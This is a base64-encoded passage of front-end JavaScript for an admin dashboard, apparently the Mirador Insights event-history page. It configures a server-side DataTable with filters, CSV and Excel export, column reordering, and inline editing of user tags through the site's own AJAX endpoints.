I3RhZ19pZCcpLnZhbChmaWx0ZXJUYWdJZCkudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImdGFnX2lkPSIrZmlsdGVyVGFnSWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGZpbHRlckRpc3BlbnNlckdyb3VwSWQpIHsKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsKICAgICAgICAgICAgICAgICAgICAkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykudmFsKGZpbHRlckRpc3BlbnNlckdyb3VwSWQpLnRyaWdnZXIoJ2NoYW5nZScpOwogICAgICAgICAgICAgICAgfSwgNTAwKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZkaXNwZW5zZXJfZ3JvdXBfaWQ9IitmaWx0ZXJEaXNwZW5zZXJHcm91cElkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJCYXR0ZXJ5U3RhdHVzKSB7CiAgICAgICAgICAgICAgICAkKCcjYmF0dGVyeV9zdGF0dXMnKS52YWwoZmlsdGVyQmF0dGVyeVN0YXR1cykudHJpZ2dlcignY2hhbmdlJyk7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICImYmF0dGVyeV9zdGF0dXM9IitmaWx0ZXJCYXR0ZXJ5U3RhdHVzOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChmaWx0ZXJMaXF1aWRMZXZlbCkgewogICAgICAgICAgICAgICAgJCgnI3Nhbml0aXphdGlvbl9jb3VudGVyJykudmFsKGZpbHRlckxpcXVpZExldmVsKS50cmlnZ2VyKCdjaGFuZ2UnKTsKICAgICAgICAgICAgICAgIGJhc2VVcmwgKz0gIiZzYW5pdGl6YXRpb25fY291bnRlcj0iK2ZpbHRlckxpcXVpZExldmVsOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCAmJiB0eXBlICE9ICdEaXNwZW5zZXJTdGF0dXMnKSB7CiAgICAgICAgICAgICAgICBpZiAoJCgnI2FwcGx5QWRkaXRpb25hbEZpbHRlcicpLmlzKCI6Y2hlY2tlZCIpKSB7CiAgICAgICAgICAgICAgICAgICAgYmFzZVVybCArPSAnJmFkZGl0aW9uYWxGaWx0ZXI9ZmFsc2UnOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmYWRkaXRpb25hbEZpbHRlcj10cnVlJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBhamF4VXJsID0gYmFzZVVybDsKICAgICAgICB9CgogICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCAmJiAkKCcjYXBwbHlBZGRpdGlvbmFsRmlsdGVyJykuaXMoIjpjaGVja2VkIikgJiYgYWpheFVybC5pbmRleE9mKCdhZGRpdGlvbmFsRmlsdGVyJykgPT09IC0xKSB7CiAgICAgICAgICAgIGFqYXhVcmwgKz0gJyZhZGRpdGlvbmFsRmlsdGVyPScrYWRkaXRpb25hbEZpbHRlck9wdGlvblt0eXBlXTsKICAgICAgICB9CiAgICAgICAgZGF0YXRhYmxlID0gJCgnI3JlY29yZHMnKS5EYXRhVGFibGUoewogICAgICAgICAgICAicHJvY2Vzc2luZyI6IHRydWUsCiAgICAgICAgICAgICJzZXJ2ZXJTaWRlIjogdHJ1ZSwKICAgICAgICAgICAgInNjcm9sbFgiOiB0cnVlLAogICAgICAgICAgICAib3JkZXIiOiBbWyBzb3J0SW5kZXgsIHNvcnRPcmRlciBdXSwKICAgICAgICAgICAgImFqYXgiOiB7CiAgICAgICAgICAgICAgICAidXJsIjogYWpheFVybCwKICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICByZWRpcmVjdFBhZ2UoQkFTRV9BRE1JTik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJjb2x1bW5zIjogY29sdW1uU3RyLAogICAgICAgICAgICAiYkluZm8iOiBmYWxzZSwKICAgICAgICAgICAgInNlYXJjaGluZyI6IHNlYXJjaGluZywKICAgICAgICAgICAgInBhZ2VMZW5ndGgiOiBwYWdlTGVuZ3RoLAogICAgICAgICAgICAibGFuZ3VhZ2UiOiB7CiAgICAgICAgICAgICAgICAic1plcm9SZWNvcmRzIjogIk5vIHJlY29yZHMgZm91bmQiLAogICAgICAgICAgICAgICAgInByb2Nlc3NpbmciOiAiPGkgY2xhc3M9XCJmYSBmYS1zcGlubmVyIGZhLXNwaW4gZmEtMnggZmEtZndcIiBzdHlsZT1cImNvbG9yOiMzNDNhNDBcIj48L2k+PHNwYW4gY2xhc3M9XCJzci1vbmx5XCI+TG9hZGluZy4ubi48L3NwYW4+IiwKICAgICAgICAgICAgICAgICJsZW5ndGhNZW51IjogIkl0ZW1zIHBlciBwYWdlOiBfTUVOVV8gIgogICAgICAgICAgICB9LAogICAgICAgICAgICAiY29sdW1uRGVmcyI6IGNvbHVtbkRlZnMsCiAgICAgICAgICAgICJwYWdpbmdUeXBlIjogImlucHV0IiwKICAgICAgICAgICAgLy9kb206ICdmbHJ0aXAnLAogICAgICAgICAgICBkb206ICc8InRvcCJmaWxwPnJ0PCJib3R0b20iaWxwPjwiY2xlYXIiPicsCiAgICAgICAgICAgIGZpeGVkQ29sdW1uczogewogICAgICAgICAgICAgICAgbGVmdDogZml4ZWRDb2x1bW5Ob3MKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYnV0dG9uczogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGV4dGVuZDogJ2NzdicsCiAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICdNaXJhZG9yIEluc2lnaHRzIEV2ZW50IEhpc3RvcnknLAogICAgICAgICAgICAgICAgICAgIGFjdGlvbjogbmV3RXhwb3J0QWN0aW9uLAogICAgICAgICAgICAgICAgICAgIGV4cG9ydE9wdGlvbnM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uczogY29sdW1uc0xpc3QKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGV4dGVuZDogJ2V4Y2VsJywKICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ01pcmFkb3IgSW5zaWdodHMgRXZlbnQgSGlzdG9yeScsCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiBuZXdFeHBvcnRBY3Rpb24sCiAgICAgICAgICAgICAgICAgICAgZXhwb3J0T3B0aW9uczogewogICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5zOiBjb2x1bW5zTGlzdAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgY3VzdG9taXplRGF0YTogZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaT0wOyBpPGRhdGEuYm9keS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaj0wOyBqPGRhdGEuYm9keVtpXS5sZW5ndGg7IGorKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuYm9keVtpXVtqXSA9ICdcdTIwMEMnICsgZGF0YS5ib2R5W2ldW2pdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAkJCQkJCiAgICAgICAgICAgIGluaXRDb21wbGV0ZTogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgZGF0YXRhYmxlLmJ1dHRvbnMoKS5jb250YWluZXIoKS5hcHBlbmRUbyggJCgnI2V4cG9ydCcpICk7CiAgICAgICAgICAgICAgICBpZiAoaW5saW5lRWRpdGluZykgewogICAgICAgICAgICAgICAgICAgICQoJy5kYXRhVGFibGVzX3Njcm9sbEhlYWQgdGgnKS5yZW1vdmVDbGFzcygndGFibGVFZGl0YWJsZSBkLWZsZXgnKTsKICAgICAgICAgICAgICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAiZml4ZWQiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVMb2FkUGFyYW1zOiBmdW5jdGlvbiAoc2V0dGluZ3MsIGRhdGEpIHsKICAgICAgICAgICAgICAgIGxldCByZWZyZXNoUGFnZUxlbmd0aCA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ3JlZnJlc2hQYWdlTGVuZ3RoJyk7CiAgICAgICAgICAgICAgICBpZiAoIXJlZnJlc2hQYWdlTGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2VMZW5ndGggPSBbXTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2VMZW5ndGggPSBKU09OLnBhcnNlKHJlZnJlc2hQYWdlTGVuZ3RoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChkYXRhLmxlbmd0aCAhPSBwYWdlTGVuZ3RoICYmIHJlZnJlc2hQYWdlTGVuZ3RoICYmICFyZWZyZXNoUGFnZUxlbmd0aC5pbmNsdWRlcyh0eXBlKSkgewogICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlTGVuZ3RoLnB1c2godHlwZSk7CiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgncmVmcmVzaFBhZ2VMZW5ndGgnLCBKU09OLnN0cmluZ2lmeShyZWZyZXNoUGFnZUxlbmd0aCkpOwogICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBkYXRhLmxlbmd0aDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29sUmVvcmRlcjogewogICAgICAgICAgICAgICAgZml4ZWRDb2x1bW5zTGVmdDogY29sUmVvcmRlckZpeGVkQ29scywKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3RhdGVTYXZlOiB0cnVlCiAgICAgICAgfSk7CgogICAgICAgIGlmICgkKCcjcmVjb3Jkc193cmFwcGVyJykubGVuZ3RoICYmIHR5cGUgPT0gJ0Rpc3BlbnNlcicpIHsKICAgICAgICAgICAgJCgnI3JlY29yZHNfd3JhcHBlcicpLnByZXBlbmQoJzxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyBjb2xvci1kYXJrLWdyZXkiPjxzdHJvbmc+IlN0cm9uZyIgZm9yIEdyZWVuLCAiV2VhayIgZm9yIFllbGxvdywgYW5kICJDcml0aWNhbCIgZm9yIFJlZDwvc3Ryb25nPjwvZGl2PicpOwogICAgICAgIH0KICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAkKCcuZGF0YVRhYmxlc19zY3JvbGxIZWFkJykuc2Nyb2xsTGVmdCgkKCcuZGF0YVRhYmxlc19zY3JvbGxCb2R5Jykuc2Nyb2xsTGVmdCgpKTsKICAgICAgICB9KTsKICAgICAgICBkYXRhdGFibGUub24oJ2NvbHVtbi1yZW9yZGVyJywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIHZhciBuZXdDb2xPcmRlciA9IFtdOwogICAgICAgICAgICBsZXQgbmV3Q29sdW1uU3RyID0gW107CiAgICAgICAgICAgIG5ld0NvbHVtblN0ci5wdXNoKGRhdGFUYWJsZUNvbHVtblN0clswXSk7CiAgICAgICAgICAgIHZhciBjb2xSZW9yZGVyID0gZGF0YXRhYmxlLmNvbFJlb3JkZXIub3JkZXIoKTsKICAgICAgICAgICAgJC5lYWNoKGNvbFJlb3JkZXIsIGZ1bmN0aW9uKGtleSwgdmFsdWUpIHsKICAgICAgICAgICAgICAgIGlmIChjb2x1bW5zTGlzdC5pbmNsdWRlcyh2YWx1ZSkgJiYgdmFsdWUgIT0gMCkgewogICAgICAgICAgICAgICAgICAgIG5ld0NvbE9yZGVyLnB1c2godmFsdWUpOwogICAgICAgICAgICAgICAgICAgIG5ld0NvbHVtblN0ci5wdXNoKGRhdGFUYWJsZUNvbHVtblN0clt2YWx1ZV0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgY29sdW1uU3RyID0gbmV3Q29sdW1uU3RyOwogICAgICAgICAgICAkKHRoaXMpLm9mZihldmVudCk7CiAgICAgICAgfSk7CiAgICAgICAgaWYgKGFwcGx5RmlsdGVyIHx8IChzaG93RmlsdGVyT3B0aW9ucyAmJiAkKCIjZmlsdGVycyIpLmlzKCI6dmlzaWJsZSIpID09IGZhbHNlKSkgewogICAgICAgICAgICBzaG93RmlsdGVycygpOwogICAgICAgIH0KCiAgICAgICAgJCgnI3JlY29yZHMgdGJvZHknKS5vbignbW91c2VlbnRlcicsICcudGFibGVFZGl0YWJsZScsIGZ1bmN0aW9uKCkgewogICAgICAgICAgICBpZiAoJCh0aGlzKS5maW5kKCdzZWxlY3QuY2hhbmdlVmFsdWUnKS5sZW5ndGggIT09IDApIHsKICAgICAgICAgICAgICAgICQodGhpcykuYXBwZW5kKCc8ZGl2IGNsYXNzPSJjYW5jZWwiPjxpIGNsYXNzPSJmYSBmYS10aW1lcyIgc3R5bGU9ImZvbnQtc2l6ZTogMXJlbSI+PC9pPjwvZGl2PicpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJCh0aGlzKS5hcHBlbmQoJzxkaXYgY2xhc3M9ImVkaXQiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwgZmEtZncgZWRpdFJlY29yZCIgc3R5bGU9ImZvbnQtc2l6ZTogMXJlbSI+PC9pPjwvZGl2PicpOwogICAgICAgICAgICB9CiAgICAgICAgfSkub24oJ21vdXNlbGVhdmUnLCAnLnRhYmxlRWRpdGFibGUnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgJCh0aGlzKS5jaGlsZHJlbigiZGl2IikucmVtb3ZlKCk7CiAgICAgICAgfSk7CgogICAgICAgICQoJyNyZWNvcmRzIHRib2R5Jykub24oJ2NsaWNrJywgJy50YWJsZUVkaXRhYmxlIC5lZGl0JywgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIGlmICghJCgnI3JlY29yZHMnKS5oYXNDbGFzcygiZWRpdGluZyIpKSB7CiAgICAgICAgICAgICAgICAkKCcjcmVjb3JkcycpLmFkZENsYXNzKCJlZGl0aW5nIik7CiAgICAgICAgICAgICAgICB2YXIgZWxlbWVudCA9ICQodGhpcykucGFyZW50KCk7CiAgICAgICAgICAgICAgICAkKGVsZW1lbnQpLmZpbmQoJ2RpdicpLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgdmFyIGNlbGxEYXRhID0gJChlbGVtZW50KS5odG1sKCk7CiAgICAgICAgICAgICAgICB2YXIgcmVjb3JkSWQgPSAkKGNlbGxEYXRhKS5hdHRyKCJyZWNvcmRJZCIpOwogICAgICAgICAgICAgICAgdmFyIHRhZ0lkID0gIiI7CiAgICAgICAgICAgICAgICBpZiAoJChjZWxsRGF0YSkuYXR0cignaHJlZicpKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIHVybFBhcnRzID0gJChjZWxsRGF0YSkuYXR0cignaHJlZicpLnNwbGl0KCIvIik7CiAgICAgICAgICAgICAgICAgICAgdGFnSWQgPSB1cmxQYXJ0c1t1cmxQYXJ0cy5sZW5ndGgtMV07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB2YXIgdGFnTGlzdCA9IFtdOwogICAgICAgICAgICAgICAgdmFyIG9wdGlvbnMgPSAnPG9wdGlvbiB2YWx1ZT0iIj48L29wdGlvbj4nOwogICAgICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgICAgICB1cmw6IEJBU0VfQURNSU4rJ1VzZXIvP2FqYXg9dHJ1ZSZpbmxpbmVFZGl0PXRydWUmdXNlcklkPScrcmVjb3JkSWQsCiAgICAgICAgICAgICAgICAgICAgZGF0YToge30sCiAgICAgICAgICAgICAgICAgICAgdHlwZTogJ3Bvc3QnLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBqc29uUmVzcG9uc2UgPSBKU09OLnBhcnNlKHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGpzb25SZXNwb25zZS5zdWNjZXNzID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBqc29uRGF0YSA9IGpzb25SZXNwb25zZS5kYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnTGlzdCA9IGpzb25EYXRhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbkRhdGEgPSBPYmplY3QuZW50cmllcyhqc29uRGF0YSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqc29uRGF0YS5zb3J0KChhLCBiKSA9PiBhWzBdLmxvY2FsZUNvbXBhcmUoYlswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbkRhdGEgPSBPYmplY3QuZnJvbUVudHJpZXMoanNvbkRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIga2V5IGluIGpzb25EYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0ZWQgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoa2V5ID09IHRhZ0lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkID0gJ3NlbGVjdGVkJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3B0aW9ucyArPSAnPG9wdGlvbiB2YWx1ZT0iJytrZXkrJyIgJytzZWxlY3RlZCsnPicranNvbkRhdGFba2V5XSsnPC9vcHRpb24+JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuaHRtbCgkKCc8c2VsZWN0IGNsYXNzPSJjaGFuZ2VWYWx1ZSB3LTEwMCIgb25jaGFuZ2U9ImNoYW5nZVVzZXJUYWcoJytyZWNvcmRJZCsnKSI+PC9zZWxlY3Q+JykuYXBwZW5kKG9wdGlvbnMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuYXBwZW5kKGNlbGxEYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICQoZWxlbWVudCkuZmluZCgnYScpLmFkZENsYXNzKCdkLW5vbmUnKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CgogICAgICAgICQoJyNyZWNvcmRzIHRib2R5Jykub24oJ2NsaWNrJywgJy50YWJsZUVkaXRhYmxlIC5jYW5jZWwnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyIGxpbmtWYWwgPSAkKHRoaXMpLnBhcmVudCgpLmZpbmQoImEiKTsKICAgICAgICAgICAgJChsaW5rVmFsKS5yZW1vdmVDbGFzcygiZC1ub25lIik7CiAgICAgICAgICAgICQodGhpcykucGFyZW50KCkuaHRtbChsaW5rVmFsKTsKICAgICAgICAgICAgJCgnI3JlY29yZHMnKS5yZW1vdmVDbGFzcygiZWRpdGluZyIpOwogICAgICAgIH0pOwogICAgfSk7CgogICAgZnVuY3Rpb24gZmlsdGVyRGF0YShvcHRpb24sIHNldFBhZ2UpIHsKICAgICAgICBpZiAodHlwZW9mIHNldFBhZ2UgPT09ICd1bmRlZmluZWQnKSB7CiAgICAgICAgICAgIHNldFBhZ2UgPSBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCQoIiNidWxrX2FjdGlvbl9zZWN0aW9uIikuaXMoIjp2aXNpYmxlIikpIHsKICAgICAgICAgICAgJCgnI2J1bGtfYWN0aW9uX3NlY3Rpb24nKS5oaWRlKCk7CiAgICAgICAgICAgICQoJyN1cGRhdGVfYWN0aW9uJykudmFsKCcnKS50cmlnZ2VyKCJjaGFuZ2UiKTsKICAgICAgICB9CiAgICAgICAgaWYgKCQoJyNmaWx0ZXJzJykuaXMoIjpoaWRkZW4iKSAmJiAhc2V0UGFnZSkgewogICAgICAgICAgICBzaG93RmlsdGVycygpOwogICAgICAgIH0KICAgICAgICAkKCIuZGF0YVRhYmxlIikuY3NzKCJ0YWJsZS1sYXlvdXQiLCAidW5zZXQiKTsKICAgICAgICB2YXIgaW5saW5lRWRpdGluZyA9ICIiOwogICAgICAgIHZhciBiYXNlVXJsID0gImh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzIjsKICAgICAgICB2YXIgc2VhcmNoVGVybSA9ICIiOwogICAgICAgIHZhciBkaXNwbGF5U3RhcnQgPSAiIjsKICAgICAgICBpZiAob3B0aW9uID09ICJmaWx0ZXIiKSB7CiAgICAgICAgICAgIGJhc2VVcmwgKz0gIi8/YWpheD10cnVlJmZpbHRlcj10cnVlJmRyYXc9MSYiOwogICAgICAgICAgICBiYXNlVXJsICs9ICQoJCgiI2ZpbHRlckZvcm0iKVswXS5lbGVtZW50cykubm90KCIubXVsdGlwbGUiKS5zZXJpYWxpemUoKTsKICAgICAgICAgICAgJCgiLm11bHRpcGxlIikuZWFjaChmdW5jdGlvbigpewogICAgICAgICAgICAgICAgaWYgKCQodGhpcykudmFsKCkpIHsKICAgICAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmJyt0aGlzLmlkKyc9JyskKHRoaXMpLnZhbCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIHNlYXJjaFRlcm0gPSBkYXRhdGFibGUuc2VhcmNoKCk7CiAgICAgICAgICAgIHBhZ2VMZW5ndGggPSBkYXRhdGFibGUucGFnZS5sZW4oKTsKICAgICAgICAgICAgaWYgKHNldFBhZ2UpIHsKICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydCA9IGRhdGF0YWJsZS5wYWdlLmluZm8oKS5wYWdlKnBhZ2VMZW5ndGg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZGF0YXRhYmxlLnN0YXRlLmNsZWFyKCk7CiAgICAgICAgfSBlbHNlIGlmIChvcHRpb24gPT0gInJlc2V0IikgewogICAgICAgICAgICBiYXNlVXJsICs9ICIvP2FqYXg9dHJ1ZSI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmaWx0ZXJGb3JtIikucmVzZXQoKTsKICAgICAgICAgICAgc2VhcmNoVGVybSA9IGRhdGF0YWJsZS5zZWFyY2goKTsKICAgICAgICAgICAgZGF0YXRhYmxlLmNvbFJlb3JkZXIucmVzZXQoKTsKICAgICAgICAgICAgZGF0YXRhYmxlLnN0YXRlLmNsZWFyKCk7CiAgICAgICAgICAgIGlmICgkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAkKCcjZGlzcGVuc2VyX2dyb3VwX2lkJykudmFsKG51bGwpLnRyaWdnZXIoImNoYW5nZSIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICQoJyNmaWx0ZXJGb3JtIConKS5maWx0ZXIoJzppbnB1dCcpLmVhY2goZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZiAoJCh0aGlzKS5wcm9wKCd0eXBlJykgPT0gJ3RleHQnKSB7CiAgICAgICAgICAgICAgICAgICAgJCh0aGlzKS52YWwoJycpLnRyaWdnZXIoImNoYW5nZSIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkKHRoaXMpLnZhbChudWxsKS50cmlnZ2VyKCJjaGFuZ2UiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCkgewogICAgICAgICAgICAgICAgaWYgKHJldmVyc2VDb25kaXRpb25BZGRpdGlvbkZpbHRlci5pbmNsdWRlcyh0eXBlKSkgewogICAgICAgICAgICAgICAgICAgICQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5wcm9wKCdjaGVja2VkJywgdHJ1ZSk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5wcm9wKCdjaGVja2VkJywgZmFsc2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkKCcjYWRkaXRpb25hbEZpbHRlcicpLmxlbmd0aCkgewogICAgICAgICAgICBpZiAoISQoJyNhcHBseUFkZGl0aW9uYWxGaWx0ZXInKS5pcygiOmNoZWNrZWQiKSkgewogICAgICAgICAgICAgICAgYmFzZVVybCArPSAnJmFkZGl0aW9uYWxGaWx0ZXI9dHJ1ZSc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBiYXNlVXJsICs9ICcmYWRkaXRpb25hbEZpbHRlcj1mYWxzZSc7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKHVzZUNvb2tpZSkgewogICAgICAgICAgICBzZXRDb29raWUoY29va2llTmFtZSwgYmFzZVVybCwgMzApOwogICAgICAgIH0KICAgICAgICBkYXRhdGFibGUuZGVzdHJveSgpOwogICAgICAgIGRhdGF0YWJsZSA9ICQoJyNyZWNvcmRzJykuRGF0YVRhYmxlKHsKICAgICAgICAgICAgInByb2Nlc3NpbmciOiB0cnVlLAogICAgICAgICAgICAic2VydmVyU2lkZSI6IHRydWUsCiAgICAgICAgICAgICJzY3JvbGxYIjogdHJ1ZSwKICAgICAgICAgICAgIm9yZGVyIjogW1sgc29ydEluZGV4LCBzb3J0T3JkZXIgXV0sCiAgICAgICAgICAgICJhamF4IjogewogICAgICAgICAgICAgICAgInVybCI6IGJhc2VVcmwsCiAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgcmVkaXJlY3RQYWdlKEJBU0VfQURNSU4pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiY29sdW1ucyI6IGNvbHVtblN0ciwKICAgICAgICAgICAgImJJbmZvIjogZmFsc2UsCiAgICAgICAgICAgICJzZWFyY2hpbmciOiBzZWFyY2hpbmcsCiAgICAgICAgICAgICJwYWdlTGVuZ3RoIjogcGFnZUxlbmd0aCwKICAgICAgICAgICAgImRpc3BsYXlTdGFydCI6IGRpc3BsYXlTdGFydCwKICAgICAgICAgICAgImxhbmd1YWdlIjogewogICAgICAgICAgICAgICAgInNaZXJvUmVjb3JkcyI6ICJObyByZWNvcmRzIGZvdW5kIiwKICAgICAgICAgICAgICAgICJwcm9jZXNzaW5nIjogIjxpIGNsYXNzPVwiZmEgZmEtc3Bpbm5lciBmYS1zcGluIGZhLTJ4IGZhLWZ3XCIgc3R5bGU9XCJjb2xvcjojMzQzYTQwXCI+PC9pPjxzcGFuIGNsYXNzPVwic3Itb25seVwiPkxvYWRpbmcuLm4uPC9zcGFuPiIsCiAgICAgICAgICAgICAgICAibGVuZ3RoTWVudSI6ICJJdGVtcyBwZXIgcGFnZTogX01FTlVfICIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInNlYXJjaCI6IHsKICAgICAgICAgICAgICAgICJzZWFyY2giOiBzZWFyY2hUZXJtCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJjb2x1bW5EZWZzIjogY29sdW1uRGVmcywKICAgICAgICAgICAgInBhZ2luZ1R5cGUiOiAiaW5wdXQiLAogICAgICAgICAgICAvL2RvbTogJ2ZscnRpcCcsCiAgICAgICAgICAgIGRvbTogJzwidG9wImZpbHA+cnQ8ImJvdHRvbSJpbHA+PCJjbGVhciI+JywKICAgICAgICAgICAgZml4ZWRDb2x1bW5zOiB7CiAgICAgICAgICAgICAgICBsZWZ0OiBmaXhlZENvbHVtbk5vcwogICAgICAgICAgICB9LAogICAgICAgICAgICBidXR0b25zOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5kOiAnY3N2JywKICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ01pcmFkb3IgSW5zaWdodHMgRXZlbnQgSGlzdG9yeScsCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiBuZXdFeHBvcnRBY3Rpb24sCiAgICAgICAgICAgICAg